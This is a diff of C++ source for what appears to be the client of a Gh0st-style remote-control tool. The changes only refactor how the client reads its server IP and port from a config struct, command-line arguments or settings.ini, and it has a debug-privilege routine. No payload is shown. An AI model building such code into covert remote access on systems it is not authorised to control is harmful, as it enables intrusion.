@@ -24,7 +24,7 @@ IsExit bExit = NULL;
 
 BOOL status = 0;
 
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN,"",0 };
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "", 0, CLIENT_TYPE_DLL };
 
 //提升权限
 void DebugPrivilege()
@@ -110,8 +110,8 @@ int main(int argc, const char *argv[])
 	SetConsoleCtrlHandler(&callback, TRUE);
 
 	do {
-		BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.szServerIP) == 0 ? "127.0.0.1" : g_ConnectAddress.szServerIP),
-			argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.iPort == 0 ? 6543 : g_ConnectAddress.iPort));
+		BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
+			argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
 		if (ret == 1) {
 			return -1;
 		}
@@ -168,16 +168,17 @@ BOOL Run(const char* argv1, int argv2) {
 	bExit = hDll ? IsExit(GetProcAddress(hDll, "IsExit")) : NULL;
 	if (run)
 	{
-		char* ip = g_ConnectAddress.szServerIP;
-		int& port = g_ConnectAddress.iPort;
+		char ip[_MAX_PATH];
+		strcpy_s(ip, g_ConnectAddress.ServerIP());
+		int port = g_ConnectAddress.ServerPort();
 		strcpy(p + 1, "settings.ini");
 		if (_access(path, 0) == -1) { // 文件不存在: 优先从参数中取值，其次是从g_ConnectAddress取值.
 			strcpy(ip, argv1);
 			port = argv2;
 		}
 		else {
-			GetPrivateProfileStringA("settings", "localIp", g_ConnectAddress.szServerIP, ip, _MAX_PATH, path);
-			port = GetPrivateProfileIntA("settings", "ghost", g_ConnectAddress.iPort, path);
+			GetPrivateProfileStringA("settings", "localIp", g_ConnectAddress.ServerIP(), ip, _MAX_PATH, path);
+			port = GetPrivateProfileIntA("settings", "ghost", g_ConnectAddress.ServerPort(), path);
 		}
 		printf("[server] %s:%d\n", ip, port);
 		do
